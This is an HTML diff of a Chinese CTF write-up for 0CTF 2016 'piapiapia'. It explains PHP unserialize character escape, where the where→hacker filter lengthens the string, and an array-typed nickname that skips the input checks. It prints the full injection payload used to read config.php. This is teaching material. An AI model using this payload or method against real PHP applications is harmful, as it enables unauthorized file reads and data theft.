-</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a><span class="x">if(preg_match('/^[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)</span>
-</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="x">    die('Invalid nickname');</span>
-</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>
-</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a><span class="x">$file = $_FILES['photo'];</span>
-</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a><span class="x">if($file['size'] &lt; 5 or $file['size'] &gt; 1000000)</span>
-</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a><span class="x">    die('Photo size error');</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">if(!preg_match('/^\d{11}$/', $_POST['phone']))</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="x">    die('Invalid phone');</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="x">if(!preg_match('/^[a-zA-Z0-9]{1,10}@[a-zA-Z0-9]{1,10}\.[a-zA-Z0-9]{1,10}$/', $_POST['email']))</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="x">    die('Invalid email');</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="x">if(preg_match('/^[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="x">    die('Invalid nickname');</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
+</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="x">$file = $_FILES['photo'];</span>
+</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="x">if($file['size'] &lt; 5 or $file['size'] &gt; 1000000)</span>
+</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="x">    die('Photo size error');</span>
 </span></code></pre></div>
 <p><strong>三个字段各有各的规矩：</strong></p>
 <table>
@@ -4089,107 +4280,107 @@
 <p><strong>这里还没想到哪里能字符逃逸</strong>，先往下看它怎么存。</p>
 <h4 id="step-5"><a class="toclink" href="../../0ctf2016-piapiapia/#step-5">Step 5：存的时候做了序列化，而且会过滤</a></h4>
 <p><img alt="序列化" src="../../../assets/images/0ctf2016-piapiapia/05-serialize.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="x">$user-&gt;update_profile($username, serialize($profile));</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">$user-&gt;update_profile($username, serialize($profile));</span>
 </span></code></pre></div>
 <p><strong>接着去看 <code>class.php</code> 里的 <code>update_profile</code>：</strong></p>
 <p><img alt="show_profile / update_profile" src="../../../assets/images/0ctf2016-piapiapia/04-show-update-profile.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="x">public function update_profile($username, $new_profile) {</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="x">    $username = parent::filter($username);</span>
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="x">    $new_profile = parent::filter($new_profile);</span>
-</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="x">    ...</span>
-</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">public function update_profile($username, $new_profile) {</span>
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">    $username = parent::filter($username);</span>
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="x">    $new_profile = parent::filter($new_profile);</span>
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="x">    ...</span>
+</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>注意：</strong>过滤发生在序列化之后** —— 它拿到的是<strong>序列化后的字符串</strong>。**</p>
 <h4 id="step-6filter"><a class="toclink" href="../../0ctf2016-piapiapia/#step-6filter">Step 6：<code>filter()</code> 里的长度差</a></h4>
 <p><img alt="filter" src="../../../assets/images/0ctf2016-piapiapia/03-filter.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="x">public function filter($string) {</span>
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="x">    $escape = array('\'', '\\\\');</span>
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="x">    $escape = '/' . implode('|', $escape) . '/';</span>
-</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="x">    $string = preg_replace($escape, '_', $string);</span>
-</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>
-</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="x">    $safe = array('select', 'insert', 'update', 'delete', 'where');</span>
-</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="x">    $safe = '/' . implode('|', $safe) . '/i';</span>
-</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="x">    return preg_replace($safe, 'hacker', $string);</span>
-</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">public function filter($string) {</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="x">    $escape = array('\'', '\\\\');</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="x">    $escape = '/' . implode('|', $escape) . '/';</span>
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="x">    $string = preg_replace($escape, '_', $string);</span>
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="x">    $safe = array('select', 'insert', 'update', 'delete', 'where');</span>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="x">    $safe = '/' . implode('|', $safe) . '/i';</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="x">    return preg_replace($safe, 'hacker', $string);</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>关键在最后一行：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>select → hacker   6 → 6   不变
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>insert → hacker   6 → 6   不变
-</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>update → hacker   6 → 6   不变
-</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>delete → hacker   6 → 6   不变
-</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>where  → hacker   5 → 6   多出 1 个字节   ⭐
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>select → hacker   6 → 6   不变
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>insert → hacker   6 → 6   不变
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>update → hacker   6 → 6   不变
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>delete → hacker   6 → 6   不变
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>where  → hacker   5 → 6   多出 1 个字节   ⭐
 </span></code></pre></div>
 <p>**<code>where</code> 只有 5 个字符，却被换成了 6 个字符的 <code>hacker</code> —— <strong>每出现一次，字符串就长 1 个字节，而前面 <code>s:N:</code> 里的 N 不变。</strong></p>
 <p><strong>这就是字符逃逸：</strong>声明长度不变，实际内容变长<strong>。</strong></p>
 <h4 id="step-7nickname"><a class="toclink" href="../../0ctf2016-piapiapia/#step-7nickname">Step 7：<code>nickname[]</code> 同时绕过两个检查</a></h4>
 <p><strong>nickname 有两条限制：字符集和长度。</strong></p>
 <p><strong>发 <code>nickname[]=xxx</code> 时，<code>$_POST['nickname']</code> 是一个</strong>数组<strong>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>strlen(array)      →  NULL（PHP 7 报 warning，返回 null）
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>                      NULL &gt; 10 为 false → 长度检查放过
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
-</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>preg_match(..., array) →  false（PHP 7 报 warning）
-</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>                      false || false = false → 不 die
+<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>strlen(array)      →  NULL（PHP 7 报 warning，返回 null）
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>                      NULL &gt; 10 为 false → 长度检查放过
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>preg_match(..., array) →  false（PHP 7 报 warning）
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>                      false || false = false → 不 die
 </span></code></pre></div>
 <p><strong>所以两条检查</strong>都<strong>被跳过了 —— 这意味着元素内容里可以出现 <code>"</code>、<code>;</code>、<code>{</code>、<code>}</code> 这些字符，这是后面构造注入串的前提。</strong></p>
 <p><strong>⚠️ 这是 PHP 7 的行为。PHP 8 里 <code>strlen(array)</code> 会抛 <code>TypeError</code>（致命错误），这条路直接 500。</strong></p>
 <h4 id="step-8-payload"><a class="toclink" href="../../0ctf2016-piapiapia/#step-8-payload">Step 8：构造 payload</a></h4>
 <p><strong>目标是让反序列化后的 <code>photo</code> 变成 <code>config.php</code>。</strong></p>
 <p><strong>先说对齐的规则：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>设：片段长度 F，where 的个数 k
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>
-</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>nickname 元素的声明长度 = 5k + F      （过滤前算的）
-</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>过滤后的实际字节       = 6k + F
-</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>
-</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>要让解析器读完声明长度后，正好停在片段开头的引号上：
-</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>
-</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a>        6k = 5k + F   →   k = F
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>设：片段长度 F，where 的个数 k
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>nickname 元素的声明长度 = 5k + F      （过滤前算的）
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>过滤后的实际字节       = 6k + F
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>要让解析器读完声明长度后，正好停在片段开头的引号上：
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>        6k = 5k + F   →   k = F
 </span></code></pre></div>
 <p><strong>我们的片段：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>";}s:5:"photo";s:10:"config.php";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>";}s:5:"photo";s:10:"config.php";}
 </span></code></pre></div>
 <p><strong>长度用 <code>strlen</code> 数是 <strong>34</strong>（别手数）→ 所以要 <strong>34 个 <code>where</code></strong>。</strong></p>
 <p><strong>然后看这个片段在干什么：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>s:204:"hacker×34         ← 声明 204，实际 238；解析器只读 204
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>       ";                ← 读完 204 正好停在这里 → 字符串正常结束
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>         }               ← 关闭内层数组 a:1:{i:0;...}
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>          s:5:"photo";s:10:"config.php";}   ← 注入 photo，并关闭外层数组
+<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>s:204:"hacker×34         ← 声明 204，实际 238；解析器只读 204
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>       ";                ← 读完 204 正好停在这里 → 字符串正常结束
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>         }               ← 关闭内层数组 a:1:{i:0;...}
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>          s:5:"photo";s:10:"config.php";}   ← 注入 photo，并关闭外层数组
 </span></code></pre></div>
 <p><strong>外层数组一关，后面原来那句 <code>s:5:"photo";s:5:"x.jpg";}</code> 就被 <code>unserialize</code> 忽略了 —— <strong>所以 nickname 必须排在 photo 前面</strong>，否则注入的结构关不掉外层，解析照样失败。</strong></p>
 <p><strong>用 PHP 7.4 模拟验证（<code>k=34</code> 且 nickname 在第三位）：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>nickname 第三  k=34  N=204  过滤后=238  photo=config.php  ✅
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>nickname 最后  k=34                       失败
-</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>k=33 / k=35                               失败
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>nickname 第三  k=34  N=204  过滤后=238  photo=config.php  ✅
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>nickname 最后  k=34                       失败
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>k=33 / k=35                               失败
 </span></code></pre></div>
 <h4 id="step-9-flag"><a class="toclink" href="../../0ctf2016-piapiapia/#step-9-flag">Step 9：发包、解码、拿 flag</a></h4>
 <p><img alt="payload" src="../../../assets/images/0ctf2016-piapiapia/06-payload.png" /></p>
 <p><strong>注册登录 → 进 update 页面 → 文件随便传一个 5~1000000 字节的 → 抓包，把 <code>nickname</code> 改成：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>name="nickname[]"
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>wherewhere……（34 个）……";}s:5:"photo";s:10:"config.php";}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>name="nickname[]"
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>wherewhere……（34 个）……";}s:5:"photo";s:10:"config.php";}
 </span></code></pre></div>
 <p><strong>发包后访问 <code>profile.php</code>：</strong></p>
 <p><img alt="flag（base64）" src="../../../assets/images/0ctf2016-piapiapia/07-flag-base64.png" /></p>
 <p><strong><code>photo</code> 已经被读成 <code>config.php</code>，内容是 base64 的图片 <code>data:image/gif;base64,...</code>，解码 ——</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>CTF2{53ec6fc8-d499-4f76-bed2-6c4c2a076b43}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>CTF2{53ec6fc8-d499-4f76-bed2-6c4c2a076b43}
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../0ctf2016-piapiapia/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>页面没线索 → dirsearch 扫出 www.zip
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>  → 源码里：config.php 有 flag，profile.php 有 file_get_contents($profile['photo'])
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>    → photo 来自 unserialize → 需要一个「photo=config.php」的序列化串
-</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>      → update.php 存的时候是 serialize() 之后再 filter()
-</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>        → filter 里 where(5) → hacker(6)，每处多 1 字节
-</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>          → 长度逃逸：N 不变、内容变长 → 多出来的字节被当成结构
-</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>            → nickname[] 绕过字符集和长度检查（PHP 7 的 strlen/preg_match 行为）
-</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a>              → 34 个 where + 34 字节片段 → photo 被改写成 config.php
-</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>                → profile.php 读出来 → base64 解码 → flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>页面没线索 → dirsearch 扫出 www.zip
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>  → 源码里：config.php 有 flag，profile.php 有 file_get_contents($profile['photo'])
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>    → photo 来自 unserialize → 需要一个「photo=config.php」的序列化串
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>      → update.php 存的时候是 serialize() 之后再 filter()
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>        → filter 里 where(5) → hacker(6)，每处多 1 字节
+</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>          → 长度逃逸：N 不变、内容变长 → 多出来的字节被当成结构
+</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>            → nickname[] 绕过字符集和长度检查（PHP 7 的 strlen/preg_match 行为）
+</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>              → 34 个 where + 34 字节片段 → photo 被改写成 config.php
+</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>                → profile.php 读出来 → base64 解码 → flag
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../0ctf2016-piapiapia/#_4">漏洞原理</a></h4>
 <p><strong>① 过滤发生在序列化之后</strong></p>
 <p><strong>序列化时把每个值的长度写死在 <code>s:N:</code> 里；过滤时又把内容改长了。</strong>写死的长度和实际内容对不上，解析器就会按旧的偏移去读 —— 多出来的那部分被当成新的结构。**</p>
 <p><strong>② 长度差的方向决定利用方式</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>变长（where→hacker，+1）：声明短于实际 → 读完 N 字节后，多出的部分被重新解析
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>变短（若存在）：          声明长于实际 → 值会吞掉后面的结构
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>变长（where→hacker，+1）：声明短于实际 → 读完 N 字节后，多出的部分被重新解析
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>变短（若存在）：          声明长于实际 → 值会吞掉后面的结构
 </span></code></pre></div>
 <p><strong>这题是前者。</strong></p>
 <p><strong>③ 类型混淆绕过检查</strong></p>
@@ -4245,28 +4436,28 @@
 <hr />
 <details class="note">
 <summary>class.php 的 filter() 与相关方法（按截图整理）</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="x">public function filter($string) {</span>
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="x">    $escape = array('\'', '\\\\');</span>
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="x">    $escape = '/' . implode('|', $escape) . '/';</span>
-</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a><span class="x">    $string = preg_replace($escape, '_', $string);</span>
-</span><span id="__span-31-5"><a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>
-</span><span id="__span-31-6"><a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="x">    $safe = array('select', 'insert', 'update', 'delete', 'where');</span>
-</span><span id="__span-31-7"><a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="x">    $safe = '/' . implode('|', $safe) . '/i';</span>
-</span><span id="__span-31-8"><a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="x">    return preg_replace($safe, 'hacker', $string);</span>
-</span><span id="__span-31-9"><a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a><span class="x">}</span>
-</span><span id="__span-31-10"><a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>
-</span><span id="__span-31-11"><a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="x">public function show_profile($username) {</span>
-</span><span id="__span-31-12"><a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a><span class="x">    $username = parent::filter($username);</span>
-</span><span id="__span-31-13"><a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="x">    $where = "username = '$username'";</span>
-</span><span id="__span-31-14"><a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a><span class="x">    $object = parent::select($this-&gt;table, $where);</span>
-</span><span id="__span-31-15"><a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a><span class="x">    return $object-&gt;profile;</span>
-</span><span id="__span-31-16"><a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a><span class="x">}</span>
-</span><span id="__span-31-17"><a id="__codelineno-31-17" name="__codelineno-31-17" href="#__codelineno-31-17"></a>
-</span><span id="__span-31-18"><a id="__codelineno-31-18" name="__codelineno-31-18" href="#__codelineno-31-18"></a><span class="x">public function update_profile($username, $new_profile) {</span>
-</span><span id="__span-31-19"><a id="__codelineno-31-19" name="__codelineno-31-19" href="#__codelineno-31-19"></a><span class="x">    $username = parent::filter($username);</span>
-</span><span id="__span-31-20"><a id="__codelineno-31-20" name="__codelineno-31-20" href="#__codelineno-31-20"></a><span class="x">    $new_profile = parent::filter($new_profile);</span>
-</span><span id="__span-31-21"><a id="__codelineno-31-21" name="__codelineno-31-21" href="#__codelineno-31-21"></a><span class="x">    ...</span>
-</span><span id="__span-31-22"><a id="__codelineno-31-22" name="__codelineno-31-22" href="#__codelineno-31-22"></a><span class="x">}</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="x">public function filter($string) {</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="x">    $escape = array('\'', '\\\\');</span>
